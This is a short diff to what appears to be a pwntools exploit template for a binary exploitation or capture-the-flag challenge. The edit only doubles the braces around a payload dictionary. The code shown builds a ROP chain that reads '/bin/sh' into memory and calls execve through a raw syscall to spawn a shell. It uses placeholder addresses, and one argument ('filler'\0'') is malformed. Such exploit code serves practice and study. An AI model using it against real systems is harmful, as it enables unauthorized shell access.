@@ -60,7 +60,7 @@ def exploit(*args, **kwargs):
 	buf  = 0xdeadbeef	# address to write "/bin/sh\x00"
 	fd   = 0
 
-	pl = flat({
+	pl = flat({{
 		# read(fd, buf, size)
 		0x0:  [p_rdi_r, fd],			
 		0x10: [p_rsi_r, buf],			
@@ -73,7 +73,7 @@ def exploit(*args, **kwargs):
 		0x20: [p_rdx_rbx_r, 0, 0],		# 3rd param: envp[] = NULL
 		0x38: [p_rax_r, 0x3b],			# syscall number 59 for execve
 		0x48: syscall_r,    
-	}, filler'\0')
+	}}, filler'\0')
 
 	sa(b'', pl)
 	sleep(1.337)
